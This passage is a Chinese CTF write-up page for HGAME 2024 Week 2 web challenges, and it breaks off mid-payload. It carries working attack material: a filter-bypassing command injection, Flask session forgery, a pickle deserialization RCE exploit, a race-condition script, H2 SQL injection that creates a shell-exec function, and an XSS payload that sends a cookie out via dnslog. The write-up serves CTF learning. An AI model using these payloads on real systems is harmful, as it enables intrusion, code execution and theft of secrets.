@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            HGAME-2024-WEEK2-Writeup
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">HGAME-2024-WEEK2-Writeup</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-02-28
+                        </span>
+                        
+                            
+                                <span id="/2024/02/28/HGAME-2024-WEEK2-Writeup/" class="leancloud_visitors" data-flag-title="HGAME-2024-WEEK2-Writeup">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/02/28/HGAME-2024-WEEK2-Writeup/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="HGAME2024-Week2-Writeup"><a href="#HGAME2024-Week2-Writeup" class="headerlink" title="HGAME2024 Week2 Writeup"></a>HGAME2024 Week2 Writeup</h1><p>Author:Ec3o</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a><strong>What the cow say?</strong></h3><p><strong>简单的命令注入</strong></p>
+<p>过滤了cat flag ; |还有一些常用的命令，不过可以用$1进行一个绕过</p>
+<p>Payload:`ca$1t${IFS}&#x2F;fl$1ag_is_here&#x2F;fl$1ag_c0w54y&#96;</p>
+<p>flag:<code>hgame&#123;C0wsay_be_c4re_aB0ut_ComMand_Injecti0n&#125;</code></p>
+<h3 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a><strong>myflask</strong></h3><p><strong>Python session伪造+pickle反序列化RCE</strong></p>
+<p>代码逻辑写的很清楚了，不会有人不会做吧（</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pytz <span class="keyword">import</span> timezone</span><br><span class="line"></span><br><span class="line">currentDateAndTime = datetime.now(timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">currentTime = currentDateAndTime.strftime(<span class="string">&quot;%H%M%S&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># Tips: Try to crack this first ↓</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = currentTime</span><br><span class="line"><span class="built_in">print</span>(currentTime)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;There is no session available in your client :(&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># For POST requests from admin</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>session伪造脚本</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> TaggedJSONSerializer</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask应用的SECRET_KEY</span></span><br><span class="line">secret_key = <span class="string">&quot;231456&quot;</span></span><br><span class="line"><span class="comment"># 你要修改的session cookie值</span></span><br><span class="line">session_cookie = <span class="string">&quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcD7qQ.6XBUbgrVhHiM4npJcpcl3GSSWhs&quot;</span></span><br><span class="line"><span class="comment"># Flask应用的salt，如果设置了的话；默认情况下Flask使用&#x27;signed_cookie&#x27;作为salt</span></span><br><span class="line">salt = <span class="string">&#x27;cookie-session&#x27;</span></span><br><span class="line"><span class="comment"># 创建序列化和反序列化的对象</span></span><br><span class="line">serializer = TaggedJSONSerializer()</span><br><span class="line">signer_kwargs = &#123;</span><br><span class="line">    <span class="string">&#x27;key_derivation&#x27;</span>: <span class="string">&#x27;hmac&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;digest_method&#x27;</span>: <span class="string">&#x27;sha1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码session cookie</span></span><br><span class="line">decoded_session = s.loads(session_cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改session数据</span></span><br><span class="line">decoded_session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>  <span class="comment"># 修改用户名为admin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新编码session cookie</span></span><br><span class="line">new_session_cookie = s.dumps(decoded_session)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原始session: <span class="subst">&#123;session_cookie&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;修改后的session: <span class="subst">&#123;new_session_cookie&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#原始session: eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcD7qQ.6XBUbgrVhHiM4npJcpcl3GSSWhs</span></span><br><span class="line"><span class="comment">#修改后的session: eyJ1c2VybmFtZSI6ImFkbWluIn0.ZcD74w.affhGC8UXyyu4j50UIosw1mio8Q</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>pickle反序列化的exp</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 使用subprocess.check_output来读取/flag文件的内容</span></span><br><span class="line">        cmd = (<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> subprocess.check_output, (cmd,)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意对象</span></span><br><span class="line">malicious_pickle = pickle.dumps(RCE())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码为Base64</span></span><br><span class="line">encoded_pickle = base64.b64encode(malicious_pickle).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encoded_pickle)</span><br><span class="line"><span class="comment">#Pickle_data:gASVMwAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMA2NhdJSMBS9mbGFnlIaUhZRSlC4=</span></span><br></pre></td></tr></table></figure>
+
+<p>保险起见，先在自己的服务器上打了一遍（通了），有secret_key方便调试</p>
+<p>secret_key是类似221812的字符串</p>
+<p>之后启动了靶机，估算一下，secret_key应该在231450-231500之间，枚举一下发现是231456</p>
+<p>用apifox发包，得到flag</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.100.137.175:32523</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZcD74w.affhGC8UXyyu4j50UIosw1mio8Q; session=eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcD7qQ.6XBUbgrVhHiM4npJcpcl3GSSWhs</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apifox/1.0.0 (https://apifox.com)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.100.137.175:32523</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"></span><br><span class="line"><span class="language-ada"><span class="comment">----WebKitFormBoundary7MA4YWxkTrZu0gW</span></span></span><br><span class="line"><span class="language-ada"><span class="comment">----WebKitFormBoundary7MA4YWxkTrZu0gW</span></span></span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>hgame&#123;addf02e8d9ddbb4eed69f81d4101b2d31805c6c5&#125;</code></p>
+<h3 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a><strong>Select More Courses</strong></h3><p><img src="C:\Users\24993\AppData\Roaming\Typora\typora-user-images\image-20240207201409778.png" alt="image-20240207201409778"></p>
+<p>登录界面提示使用弱密码，我们拿题目给出的提示字典进行弱密码爆破,发现密码是qwert123</p>
+<p>接下来进入选课界面，发现有扩学分和选课两个界面</p>
+<p>扩学分直接扩不了，提示Race Against Time，想到条件竞争漏洞</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://47.102.130.35:32646&quot;</span></span><br><span class="line">url_login = url+<span class="string">&quot;/api/auth/login&quot;</span></span><br><span class="line">url_select=url+<span class="string">&quot;/api/select&quot;</span></span><br><span class="line">url_expand=url+<span class="string">&quot;/api/expand&quot;</span></span><br><span class="line"><span class="comment">#登录</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_session</span>():</span><br><span class="line">    headers_login = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;47.102.130.35:32646&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.102.130.35:32646&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.102.130.35:32646/login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;ma5hr00m&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;qwert123&#x27;</span>&#125;</span><br><span class="line">    response = requests.post(url_login, json=data, headers=headers_login)</span><br><span class="line">    response_headers=response.headers</span><br><span class="line">    session_value = response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;login done!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> session_value</span><br><span class="line">session_value=get_session()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Session value: <span class="subst">&#123;session_value&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#扩学分</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand</span>(<span class="params">session_value</span>):</span><br><span class="line">    headers_expand =&#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;47.102.130.35:32646&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>:<span class="string">&quot;23&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.102.130.35:32646&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.102.130.35:32646/expand&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">f&quot;session=<span class="subst">&#123;session_value&#125;</span>&quot;</span>&#125;</span><br><span class="line">    data_expand = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ma5hr00m&quot;</span>&#125;</span><br><span class="line">    response_expand = requests.post(url_expand, json=data_expand, headers=headers_expand)</span><br><span class="line">    <span class="built_in">print</span>(response_expand.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;expand done!&quot;</span>)</span><br><span class="line"><span class="comment">#选课</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select</span>(<span class="params">session_value</span>):</span><br><span class="line">    headers_select =&#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;47.102.130.35:32646&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>:<span class="string">&quot;30&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.102.130.35:32646&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.102.130.35:32646/select&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">f&quot;session=<span class="subst">&#123;session_value&#125;</span>&quot;</span>&#125;</span><br><span class="line">    data_select = &#123;<span class="string">&quot;id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ma5hr00m&quot;</span>&#125;</span><br><span class="line">    response_select = requests.post(url_select, json=data_select, headers=headers_select)</span><br><span class="line">    <span class="built_in">print</span>(response_select.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;select done!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        executor.submit(expand, session_value)</span><br><span class="line">	    executor.submit(select, session_value)</span><br></pre></td></tr></table></figure>
+
+<p>多线程发包在服务器未完成响应的情况下完成扩学分功能，之后去领flag就行</p>
+<p>Flag:<code>hgame&#123;5ak_p45sW0rD_&amp;_r4Ce_c0nDiT10n&#125;</code></p>
+<h3 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a><strong>search4member</strong></h3><p>H2数据库Like注入</p>
+<p>来自官方writeup：</p>
+<p><strong>注册一个新的shell函数：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SJTU%&#x27;;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws</span><br><span class="line">java.io.IOException &#123; java.util.Scanner s = new</span><br><span class="line">java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter</span><br><span class="line">(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;SELECT * FROM member WHERE</span><br><span class="line">intro LIKE &#x27;%13</span><br></pre></td></tr></table></figure>
+
+<p><strong>将新注册的shell函数插入回原表：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SJTU%&#x27;;INSERT INTO member (id, intro, blog) VALUES</span><br><span class="line">(&#x27;flag&#x27;,&#x27;flag&#x27;,SHELLEXEC(&#x27;cat /flag&#x27;));SELECT * FROM member WHERE intro LIKE</span><br><span class="line">&#x27;%13</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取flag回显</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>hgame&#123;c434ec279f5354ffa399a046d183ea329f73f77c&#125;</code></p>
+<h3 id="梅开二度"><a href="#梅开二度" class="headerlink" title="梅开二度"></a>梅开二度</h3><p>Go语言实现的xss漏洞靶场，waf很严格,我们可以利用dnslog平台读取回显</p>
+<p>http端点有三个</p>
+<ul>
+<li>&#x2F;                                         参数tmpl   存在较为严格的xss过滤，但是可以使用SSTI+传参绕过实现xss</li>
+<li>&#x2F;bot                                   参数url       要求传递url到bot对象，限制要求是127.0.0.1:8080下的端点信息</li>
+<li>&#x2F;flag                                   没有参数，对本地访问来源设置flag cookie.</li>
+</ul>
+<p>基本思路是让bot访问&#x2F;flag获得cookie，之后访问&#x2F;利用tmpl传参获取flag</p>
+<p><strong>Cookie</strong>是<strong>httponly</strong>的，只能构造<strong>http</strong>请求来传递flag。</p>
+<p>HTML构建一个自动发送请求的页面，但是cookie的有效域也是本地…</p>
+<p>获取cookieURL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080?tmpl=&#123;&#123;.Query .Request.Method | .GetHeader&#125;&#125;&amp;GET=Cookie</span><br></pre></td></tr></table></figure>
+
+<p>引导bot访问上面的url，并把获取到的cookie进行处理（获得大括号内内容），并作为域名头发送请求来偷flag</p>
+<p>尝试通过dns传出信息</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/flag&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;http://127.0.0.1:8080?tmpl=&#123;&#123;.Query .Request.Method | .GetHeader&#125;&#125;&amp;GET=Cookie&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>().<span class="title function_">then</span>(<span class="function"><span class="params">t</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> matched = t.<span class="title function_">match</span>(<span class="regexp">/\%7B([^&#125;]+)\%7D/</span>);<span class="comment">//将flag进行脱壳，获得hgame&#123;&#125;内部的字符串作为域名头</span></span><br><span class="line">        <span class="keyword">let</span> contentWithinBraces = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (matched) &#123;</span><br><span class="line">            contentWithinBraces = matched[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">let</span> newUrl = <span class="string">`http://<span class="subst">$&#123;contentWithinBraces&#125;</span>.crg9yr.dnslog.cn/`</span>;</span><br><span class="line">            <span class="title function_">fetch</span>(newUrl, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>压缩成一行代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&quot;/flag&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">_</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&quot;http://127.0.0.1:8080?tmpl=&#123;&#123;.Query .Request.Method | .GetHeader&#125;&#125;&amp;GET=Cookie&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>().<span class="title function_">then</span>(<span class="function"><span class="params">t</span> =&gt;</span> &#123;<span class="keyword">const</span> matched = t.<span class="title function_">match</span>(<span class="regexp">/\%7B([^&#125;]+)\%7D/</span>); <span class="keyword">if</span> (matched) &#123; <span class="keyword">let</span> contentWithinBraces = matched[<span class="number">1</span>]; <span class="title function_">fetch</span>(<span class="string">`http://<span 